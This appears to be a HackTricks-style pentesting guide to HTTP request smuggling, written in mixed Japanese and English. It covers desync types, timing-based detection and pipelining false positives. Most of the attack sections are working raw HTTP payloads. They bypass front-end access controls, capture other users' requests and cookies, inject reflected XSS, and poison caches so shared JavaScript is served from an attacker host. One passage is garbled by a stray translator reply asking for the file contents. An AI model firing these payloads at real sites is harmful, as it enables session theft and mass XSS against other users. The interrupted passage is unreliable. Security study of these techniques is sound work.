# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## この脆弱性とは

この脆弱性は、**desyncronization** が **front-end proxies** と **back-end** server の間で発生し、**attacker** が HTTP の **request** を **front-end** proxies（load balance/reverse-proxy）には **single request** として、**back-end** server には **2 request** として **interpreted** されるような状況で発生します。\
これにより、ユーザは **自分のリクエストの次に back-end server に到着するリクエストを改変する** ことが可能になります。

### 理論

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

**Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

**Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

### 実際

**Front-End**（load-balance / Reverse Proxy）が _**Content-Length**_ または _**Transfer-Encoding**_ ヘッダを処理し、**Back-end** server がもう一方を処理することで、両者の間に **desyncronization** が発生します。\
これは非常に深刻になり得ます。なぜなら **attacker** は reverse proxy に対して 1 つの request を送り、それが **back-end** server によって **2 つの異なる request** として **interpreted** されるからです。 この手法の危険性は、**back-end** server が **注入された 2 番目の request** を次のクライアントから来たものとして扱い、そのクライアントの本来のリクエストが **注入された request** の一部になる点にあります。

### 特記事項

HTTP では **改行文字は 2 バイトで構成される** ことを覚えておいてください:

- **Content-Length**: このヘッダは **10 進数** を使ってリクエストの **body** の **バイト数** を示します。ボディは最後の文字で終わることが期待され、**リクエストの末尾に改行は必須ではありません**。
- **Transfer-Encoding:** このヘッダは **body** 内で **16 進数** を使って次のチャンクの **バイト数** を示します。チャンクは **改行で終わる必要** があり、この改行は長さの指標に **含まれません**。この転送方式は **サイズ 0 のチャンクが続き、2 つの改行で終了** する必要があります: `0`
- **Connection**: 経験上、request smuggling の最初のリクエストでは **`Connection: keep-alive`** を使うことが推奨されます。

### Visible - Hidden

HTTP/1.1 の主な問題は、すべてのリクエストが同一の TCP ソケット内を流れるため、2 つのシステム間で受信したリクエストの扱いに不一致があると、1 つのリクエストが最終的な backend（あるいは中間システム）によって 2 件以上の別個のリクエストとして処理され得る点にあります。

**[This blog post](https://portswigger.net/research/http1-must-die)** は、WAF に検知されない方法で desync 攻撃を検出する新しい手法を提案しています。そのために Visible vs Hidden の振る舞いを提示しています。この場合の目的は、実際に exploit せずに desync を引き起こしている可能性のある技術を使って、レスポンスに不一致があるかどうかを探すことです。

例えば、通常の Host ヘッダと " host" ヘッダの両方を送信し、バックエンドがこのリクエストに対して不満を示す（たとえば " host" の値が不正であるため）場合、front-end が " host" ヘッダを認識しなかったが最終的な backend はそれを使用した可能性があり、front-end と backend の間に desync があることを示唆します。

これは **Hidden-Visible discrepancy** になります。

逆に、front-end が " host" ヘッダを取り扱っていたが backend は扱っていなかった場合は **Visible-Hidden** の状況と言えます。

この考え方は、AWS ALB を front-end、IIS を backend にしたケースでの desync を発見するのに役立ちました。これは "Host: foo/bar" を送信したときに ALB が `400, Server; awselb/2.0` を返したが、"Host : foo/bar" を送ったときに `400, Server: Microsoft-HTTPAPI/2.0` を返し、backend がレスポンスを返していることを示したためです。これは Hidden-Visible（H-V）の状況です。

この問題は AWS 側で完全に修正されているわけではありませんが、`routing.http.drop_invalid_header_fields.enabled` を設定し、`routing.http.desync_mitigation_mode = strictest` を使うことで緩和できます。


## Basic Examples

> [!TIP]
> When trying to exploit this with Burp Suite **disable `Update Content-Length` and `Normalize HTTP/1 line endings`** in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths.

HTTP request smuggling 攻撃は、front-end と back-end サーバが `Content-Length` (CL) と `Transfer-Encoding` (TE) ヘッダを解釈する際の差異を悪用する曖昧なリクエストを送信することで作成されます。これらの攻撃は主に **CL.TE**, **TE.CL**, **TE.TE** として現れます。各タイプは front-end と back-end がこれらのヘッダをどのように優先するかの組み合わせを表します。脆弱性は、同じリクエストをサーバが異なる方法で処理することにより生じ、予期しない悪意ある結果につながります。

### Basic Examples of Vulnerability Types

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> To the previous table you should add the TE.0 technique, like CL.0 technique but using Transfer Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** `Content-Length` ヘッダに基づいてリクエストを処理します。
- **Back-End (TE):** `Transfer-Encoding` ヘッダに基づいてリクエストを処理します。
- **Attack Scenario:**

- 攻撃者は `Content-Length` ヘッダの値が実際のコンテンツ長と一致しないリクエストを送信します。
- front-end サーバは `Content-Length` の値に基づいてリクエスト全体を back-end に転送します。
- back-end サーバは `Transfer-Encoding: chunked` ヘッダによりリクエストをチャンク方式として処理し、残りのデータを別の続きのリクエストとして解釈します。
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** `Transfer-Encoding` ヘッダに基づいてリクエストを処理します。
- **Back-End (CL):** `Content-Length` ヘッダに基づいてリクエストを処理します。
- **Attack Scenario:**

- 攻撃者はチャンク化されたリクエストを送り、チャンクサイズ（`7b`）と実際の `Content-Length: 4` が一致しないようにします。
- front-end サーバは `Transfer-Encoding` を尊重してリクエスト全体を back-end に転送します。
- back-end サーバは `Content-Length` を尊重して最初の部分（指定されたバイト数）だけを処理し、残りを意図しない続きのリクエストの一部として残します。
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** 両方が `Transfer-Encoding` をサポートしているが、1 つはオブフスケーションによってそれを認識できなくなることがある。
- **Attack Scenario:**

- 攻撃者は obfuscation を施した `Transfer-Encoding` ヘッダを含むリクエストを送信します。
- どちらのサーバ（front-end または back-end）がそのオブフスケーションを認識できないかによって、CL.TE または TE.CL の脆弱性を突ける場合があります。
- 片方のサーバにとって未処理のまま残ったリクエストの一部が、続くリクエストの一部として扱われ、smuggling が発生します。
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- 両方のサーバが `Content-Length` ヘッダのみを基にリクエストを処理します。
- このシナリオは通常 smuggling を引き起こしません。というのも、両サーバの解釈が一致しているためです。
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- `Content-Length` ヘッダが存在し、0 以外の値を持つシナリオを指します。back-end が `Content-Length` ヘッダを無視して（0 と見なして）処理する一方で、front-end はそれを解析するような状況です。
- これはリクエストの終端をサーバがどのように判断するかに影響するため、smuggling 攻撃を理解・作成する上で重要です。
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- 上の CL.0 と同様ですが、TE を使用した場合です。
- Technique [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Example**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### `0.CL` シナリオ

`0.CL` の状況では、Content-Length のような値を持つリクエストが送信されます:
```
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
7

GET /404 HTTP/1.1
X: Y
```
そして front-end は `Content-Length` を考慮しないため、例では最初の request（例の 7 まで）だけを backend に送信します。しかし backend は `Content-Length` を見て、front-end が既に response を待っているため到着しない body を待ち続けます。

ただし、backend に送った request の body を受け取る前にレスポンスを返せる request があれば、このデッドロックは発生しません。例えば IIS では `/con` のような forbidden words へのリクエストを送るとこれが起きます（[documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file) を参照）。このようにして、最初の request は直接レスポンスされ、2 番目の request は被害者の request を含むようになります：
```
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```
これは desync を引き起こすのに有用だが、これまでのところ影響はない。

しかし、その投稿はこれに対する解決策を提供しており、**[0.CL attack into a CL.0 with a double desync](https://portswigger.net/research/http1-must-die)** に変換する方法を示している。

#### ウェブサーバのクラッシュ

この手法は、初期の HTTP データを読み取っている間にウェブサーバをクラッシュさせられるが、接続を閉じない状況でも有用です。こうすると、HTTP リクエストの **body** が次の HTTP リクエストとして扱われます。

例えば、[**this writeup**](https://mizu.re/post/twisty-python) で説明されているように、Werkzeug ではいくつかの **Unicode** 文字を送信することでサーバが**クラッシュ**する可能性がありました。しかし、HTTP 接続がヘッダ **`Connection: keep-alive`** で作成されている場合、リクエストの **body** は読み取られず接続は開いたままになるため、リクエストの **body** が**次の HTTP リクエスト** として扱われます。

#### hop-by-hop headers を使った強制

hop-by-hop headers を悪用することで、プロキシに **ヘッダ Content-Length または Transfer-Encoding を削除し、HTTP request smuggling を悪用できるようにする** と指示できる。
```
Connection: Content-Length
```
For **more information about hop-by-hop headers** visit:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## HTTP Request Smuggling の発見方法

HTTP request smuggling 脆弱性の特定は、操作したリクエストに対するサーバの応答時間を観察するタイミング技術で達成できることが多いです。これらの技術は特に CL.TE と TE.CL の脆弱性を検出するのに有効です。これらの方法に加えて、脆弱性を見つけるために使える他の戦略やツールもあります。

### Timing 技術を使った CL.TE 脆弱性の発見

- 方法:
  - アプリケーションが脆弱であれば、バックエンドサーバが追加のデータを待機するようなリクエストを送る。
- 例:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- 観察点:
  - フロントエンドサーバが `Content-Length` に基づいてリクエストを処理し、メッセージを早期に切り落とす。
  - バックエンドサーバは chunked メッセージを期待しており、次のチャンクが届かないため待機し、遅延が発生する。

- 指標:
  - タイムアウトや長い応答遅延。
  - バックエンドサーバから 400 Bad Request エラーを受け取り、場合によっては詳細なサーバ情報が含まれることがある。

### Timing 技術を使った TE.CL 脆弱性の発見

- 方法:
  - アプリケーションが脆弱であれば、バックエンドサーバが追加のデータを待機するようなリクエストを送る。
- 例:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- 観察点:
  - フロントエンドサーバが `Transfer-Encoding` を基にリクエストを処理してメッセージ全体を転送する。
  - バックエンドサーバは `Content-Length` に基づくメッセージを期待しており、追加データが届かないため待機し、遅延が発生する。

### 脆弱性を見つけるためのその他の方法

- Differential Response Analysis:
  - リクエストのわずかに異なるバージョンを送信し、サーバ応答が予期せぬ違いを示すか観察する。これはパースの不一致を示す。
- Using Automated Tools:
  - Burp Suite の 'HTTP Request Smuggler' extension のようなツールは、各種あいまいなリクエストを自動で送って応答を解析することでこれらの脆弱性を検査できる。
- Content-Length Variance Tests:
  - 実際のコンテンツ長と一致しない様々な `Content-Length` 値のリクエストを送信し、サーバがそれらの不一致をどう処理するかを観察する。
- Transfer-Encoding Variance Tests:
  - `Transfer-Encoding` ヘッダを難読化したり破損させたりしたリクエストを送信し、フロントエンドとバックエンドがそれらにどう異なって応答するかを監視する。

### The `Expect: 100-continue` header

このヘッダが http desync を利用するのにどう役立つかは以下を参照:

{{#ref}}
../special-http-headers.md
{{#endref}}

### HTTP Request Smuggling 脆弱性のテスト

タイミング技術の有効性を確認した後、クライアントからのリクエストを操作できるかどうかを検証することが重要です。単純な方法はリクエストを汚染して、例えば `/` へのリクエストが 404 を返すようにすることです。前述の CL.TE と TE.CL の例は、クライアントが別のリソースにアクセスしようとしているにもかかわらず、クライアントのリクエストを汚染して 404 を引き出す方法を示しています（[Basic Examples](#basic-examples) を参照）。

重要な考慮点

リクエストを妨害して request smuggling 脆弱性をテストする際は、以下を念頭に置いてください:

- Distinct Network Connections:
  - 「攻撃」リクエストと「通常」リクエストは別々のネットワーク接続で送るべきです。両方を同じ接続で送ると脆弱性の存在は検証できません。
- Consistent URL and Parameters:
  - 両リクエストで同一の URL とパラメータ名を使うことを目指してください。モダンなアプリケーションは URL やパラメータに基づいて特定のバックエンドサーバにルーティングすることが多いです。これらを一致させることで、両リクエストが同じサーバで処理される可能性が高まり、攻撃成功の前提条件となります。
- Timing and Racing Conditions:
  - 「通常」リクエストは「攻撃」リクエストによる干渉を検出するためのもので、他の同時実行中のアプリケーションリクエストと競合します。したがって「攻撃」リクエストの直後に「通常」リクエストを送信してください。負荷の高いアプリケーションでは結論を出すために複数回の試行が必要になることがあります。
- Load Balancing Challenges:
  - フロントエンドサーバがロードバランサとして機能している場合、リクエストは複数のバックエンドへ分散される可能性があります。「攻撃」と「通常」のリクエストが異なるシステムに送られると攻撃は失敗します。このロードバランシングの影響で脆弱性を確認するために複数回の試行が必要になることがあります。
- Unintended User Impact:
  - もし攻撃が意図せず別のユーザのリクエストに影響を与えた場合（テスト用の「通常」リクエストではない他のユーザのリクエストに影響を与えた場合）、それはあなたの攻撃が他のアプリケーションユーザに影響を及ぼしたことを示します。継続的なテストは他ユーザを混乱させる可能性があるため、慎重に行ってください。

## Distinguishing HTTP/1.1 pipelining artifacts vs genuine request smuggling

Connection reuse (keep-alive) と pipelining は、同じソケット上で複数のリクエストを送るテストツールにおいて「smuggling」の幻影を簡単に生み出します。クライアント側の無害なアーティファクトと実際のサーバ側のデスインクを区別する方法を学んでください。

### なぜ pipelining が古典的な false positives を作るのか

HTTP/1.1 は単一の TCP/TLS 接続を再利用して同じストリーム上にリクエストとレスポンスを連結します。pipelining ではクライアントが複数のリクエストを立て続けに送り、順序通りの応答を期待します。一般的な false-positive の例は、単一の接続で malformed CL.0-style payload を二度再送することです:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
I don't have the file contents. Please paste the contents of src/pentesting-web/http-request-smuggling/README.md here and I'll translate the relevant English text to Japanese, preserving all markdown/html, code, tags, links, and paths per your rules.
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
サーバーが不正な `Content_Length` を無視した場合、FE↔BE desync は発生しません。再利用時、クライアントは実際にこのバイトストリームを送信し、サーバーはそれを2つの独立したリクエストとして解析します:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Impact: none. You just desynced your client from the server framing.

> [!TIP]
> Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

### Litmus tests: pipelining or real desync?

1. Disable reuse and re-test
- In Burp Intruder/Repeater, turn off HTTP/1 reuse and avoid "Send group in sequence".
- In Turbo Intruder, set `requestsPerConnection=1` and `pipeline=False`.
- If the behavior disappears, it was likely client-side pipelining, unless you’re dealing with connection-locked/stateful targets or client-side desync.
2. HTTP/2 nested-response check
- Send an HTTP/2 request. If the response body contains a complete nested HTTP/1 response, you’ve proven a backend parsing/desync bug instead of a pure client artifact.
3. Partial-requests probe for connection-locked front-ends
- Some FEs only reuse the upstream BE connection if the client reused theirs. Use partial-requests to detect FE behavior that mirrors client reuse.
- See PortSwigger "Browser‑Powered Desync Attacks" for the connection-locked technique.
4. State probes
- Look for first- vs subsequent-request differences on the same TCP connection (first-request routing/validation).
- Burp "HTTP Request Smuggler" includes a connection‑state probe that automates this.
5. Visualize the wire
- Use the Burp "HTTP Hacker" extension to inspect concatenation and message framing directly while experimenting with reuse and partial requests.

### Connection‑locked request smuggling (reuse-required)

Some front-ends only reuse the upstream connection when the client reuses theirs. Real smuggling exists but is conditional on client-side reuse. To distinguish and prove impact:
- Prove the server-side bug
- Use the HTTP/2 nested-response check, or
- Use partial-requests to show the FE only reuses upstream when the client does.
- Show real impact even if direct cross-user socket abuse is blocked:
- Cache poisoning: poison shared caches via the desync so responses affect other users.
- Internal header disclosure: reflect FE-injected headers (e.g., auth/trust headers) and pivot to auth bypass.
- Bypass FE controls: smuggle restricted paths/methods past the front-end.
- Host-header abuse: combine with host routing quirks to pivot to internal vhosts.
- Operator workflow
- Reproduce with controlled reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → "Send group in sequence (single connection)").
- Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>{{#endref}}

### Client‑side desync constraints

If you’re targeting browser-powered/client-side desync, the malicious request must be sendable by a browser cross-origin. Header obfuscation tricks won’t work. Focus on primitives reachable via navigation/fetch, and then pivot to cache poisoning, header disclosure, or front-end control bypass where downstream components reflect or cache responses.

For background and end-to-end workflows:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Tooling to help decide

- HTTP Hacker (Burp BApp Store): exposes low-level HTTP behavior and socket concatenation.
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: precise control over connection reuse via `requestsPerConnection`.
- Burp HTTP Request Smuggler: includes a connection‑state probe to spot first‑request routing/validation.

> [!NOTE]
> Treat reuse-only effects as non-issues unless you can prove server-side desync and attach concrete impact (poisoned cache artifact, leaked internal header enabling privilege bypass, bypassed FE control, etc.).

## Abusing HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

Sometimes, front-end proxies enforce security measures, scrutinizing incoming requests. However, these measures can be circumvented by exploiting HTTP Request Smuggling, allowing unauthorized access to restricted endpoints. For instance, accessing `/admin` might be prohibited externally, with the front-end proxy actively blocking such attempts. Nonetheless, this proxy may neglect to inspect embedded requests within a smuggled HTTP request, leaving a loophole for bypassing these restrictions.

Consider the following examples illustrating how HTTP Request Smuggling can be used to bypass front-end security controls, specifically targeting the `/admin` path which is typically guarded by the front-end proxy:

**CL.TE Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
CL.TE attackでは、初期リクエストには`Content-Length`ヘッダが使われ、続く埋め込まれたリクエストでは`Transfer-Encoding: chunked`ヘッダが使用されます。フロントエンドのプロキシは最初の`POST`リクエストを処理しますが、埋め込まれた`GET /admin`リクエストを検査できないため、`/admin`パスへの不正アクセスが可能になります。

**TE.CL Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
逆に、TE.CL attackでは、最初の`POST`リクエストが`Transfer-Encoding: chunked`を使用し、その後に埋め込まれたリクエストは`Content-Length`ヘッダーに基づいて処理されます。CL.TE attackと同様に、フロントエンドプロキシは密輸された`GET /admin`リクエストを見落とし、結果的に制限された`/admin`パスへのアクセスを許可してしまいます。

### フロントエンドのリクエスト書き換えを明らかにする <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

アプリケーションは、受信したリクエストをバックエンドサーバに渡す前に変更するために、**front-end server**を利用することがよくあります。典型的な変更は、クライアントのIPをバックエンドに伝えるために、`X-Forwarded-For: <IP of the client>` のようなヘッダーを追加することです。これらの変更を理解することは重要です。なぜなら、**保護を回避する**方法や、**隠された情報やエンドポイントを発見する**方法が明らかになる可能性があるからです。

プロキシがリクエストをどのように変更するかを調べるには、バックエンドがレスポンス内でエコーするPOSTパラメータを見つけます。次に、そのパラメータを最後に使用する形で、以下のようなリクエストを作成します：
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
この構造では、後続のリクエストコンポーネントが `search=` の後ろに追加され、これはレスポンスに反映されるパラメータです。この反映によって後続リクエストのヘッダが露出します。

`Content-Length` ヘッダをネストされたリクエストの実際のコンテンツ長と一致させることが重要です。小さい値から始めて徐々に増やすのが望ましく、値が小さすぎると反映データが切り詰められ、大きすぎるとリクエストがエラーになる可能性があります。

この手法は TE.CL 脆弱性の文脈でも適用できますが、リクエストは `search=\r\n0` で終了する必要があります。改行文字に関係なく、値は search パラメータに追加されます。

この方法は主にフロントエンドプロキシによって行われるリクエストの変更を理解するために用いられ、事実上の自己調査を行うものです。

### 他のユーザーのリクエストをキャプチャする <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

POST 操作中にパラメータの値として特定のリクエストを追加することで、次のユーザーのリクエストをキャプチャすることが可能です。以下はその方法です：

以下のリクエストをパラメータの値として追加することで、続くクライアントのリクエストを保存できます：
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
このシナリオでは、**comment parameter** は公開ページの投稿のコメント欄に内容を保存することを意図しています。そのため、後続のリクエストの内容はコメントとして表示されます。

しかし、この手法には制限があります。一般に、スムグルされたリクエストで使用されるパラメータ区切り文字までしかデータを取得できません。URL エンコードされたフォーム送信では、この区切り文字は `&` です。つまり、被害者ユーザのリクエストから取得される内容は最初の `&` で途切れます。これはクエリ文字列の一部である場合もあります。

また、この手法は TE.CL 脆弱性でも有効である点に注意してください。その場合、リクエストは `search=\r\n0` で終了させる必要があります。改行文字がどうであれ、値は search パラメータに追記されます。

### Using HTTP request smuggling to exploit reflected XSS

HTTP Request Smuggling は **Reflected XSS** に脆弱なウェブページを悪用するために利用できます。主な利点は次の通りです：

- ターゲットユーザとのやり取りは **不要** です。
- 普通は到達できないようなリクエストの一部（例：HTTP request headers）で XSS を悪用できます。

ウェブサイトが User-Agent header を介して Reflected XSS に脆弱な場合、次の payload はこの脆弱性を悪用する方法を示します：
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
This payload is structured to exploit the vulnerability by:

1. Initiating a `POST` request, seemingly typical, with a `Transfer-Encoding: chunked` header to indicate the start of smuggling.
2. Following with a `0`, marking the end of the chunked message body.
3. Then, a smuggled `GET` request is introduced, where the `User-Agent` header is injected with a script, `<script>alert(1)</script>`, triggering the XSS when the server processes this subsequent request.

By manipulating the `User-Agent` through smuggling, the payload bypasses normal request constraints, thus exploiting the Reflected XSS vulnerability in a non-standard but effective manner.

#### HTTP/0.9

> [!CAUTION]
> ユーザコンテンツが **`text/plain`** のような **`Content-type`** でレスポンスに反映される場合、XSS の実行は防がれます。サーバが **HTTP/0.9** をサポートしている場合、これを回避できる可能性があります！

The version HTTP/0.9 was previously to the 1.0 and only uses **GET** verbs and **doesn’t** respond with **headers**, just the body.

In [**this writeup**](https://mizu.re/post/twisty-python), this was abused with a request smuggling and a **vulnerable endpoint that will reply with the input of the user** to smuggle a request with HTTP/0.9. The parameter that will be reflected in the response contained a **fake HTTP/1.1 response (with headers and body)** so the response will contain valid executable JS code with a `Content-Type` of `text/html`.

### Exploiting On-site Redirects with HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Applications often redirect from one URL to another by using the hostname from the `Host` header in the redirect URL. This is common with web servers like Apache and IIS. For instance, requesting a folder without a trailing slash results in a redirect to include the slash:
```
GET /home HTTP/1.1
Host: normal-website.com
```
結果:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
一見無害に見えるが、この挙動は HTTP request smuggling を利用してユーザーを外部サイトにリダイレクトするよう操作できる。例えば：
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
このスミッギングされたリクエストは、次に処理されるユーザーのリクエストを攻撃者が管理するウェブサイトにリダイレクトさせる可能性があります:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
結果:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
このシナリオでは、ユーザの JavaScript ファイルへのリクエストがハイジャックされます。攻撃者は悪意ある JavaScript を返すことでユーザを侵害できる可能性があります。

### Exploiting Web Cache Poisoning via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning は、一般にパフォーマンス向上のために**フロントエンドのインフラがコンテンツをキャッシュしている**場合に実行できます。サーバのレスポンスを操作することで、**poison the cache** が可能になります。

前述のとおり、サーバのレスポンスを改変して 404 エラーを返すことができる例を見ました（参照: [Basic Examples](#basic-examples)）。同様に、`/static/include.js` を要求した際にサーバに `/index.html` の内容を返させるようトリックすることも可能です。結果として、`/static/include.js` のキャッシュが `/index.html` の内容で置き換えられ、ユーザが `/static/include.js` にアクセスできなくなり、場合によっては DoS を引き起こす可能性があります。

この手法は、**Open Redirect vulnerability** が見つかった場合、または **on-site redirect to an open redirect** が存在する場合に特に強力になります。これらの脆弱性を利用して、キャッシュされた `/static/include.js` の内容を攻撃者が制御するスクリプトに置き換えることができ、結果的に更新された `/static/include.js` を要求する全てのクライアントに対して大規模な Cross-Site Scripting (XSS) 攻撃を仕掛けることが可能になります。

以下は、**cache poisoning combined with an on-site redirect to open redirect** を悪用する例です。目的は、`/static/include.js` のキャッシュ内容を攻撃者が制御する JavaScript コードに書き換えることです:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Note the embedded request targeting `/post/next?postId=3`. This request will be redirected to `/post?postId=4`, utilizing the **Host header value** to determine the domain. By altering the **Host header**, the attacker can redirect the request to their domain (**on-site redirect to open redirect**).

After successful **socket poisoning**, a **GET request** for `/static/include.js` should be initiated. This request will be contaminated by the prior **on-site redirect to open redirect** request and fetch the content of the script controlled by the attacker.

Subsequently, any request for `/static/include.js` will serve the cached content of the attacker's script, effectively launching a broad XSS attack.

### Using HTTP request smuggling to perform web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **What is the difference between web cache poisoning and web cache deception?**
>
> - In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
> - In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

The attacker crafts a smuggled request that fetches sensitive user-specific content. Consider the following example:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
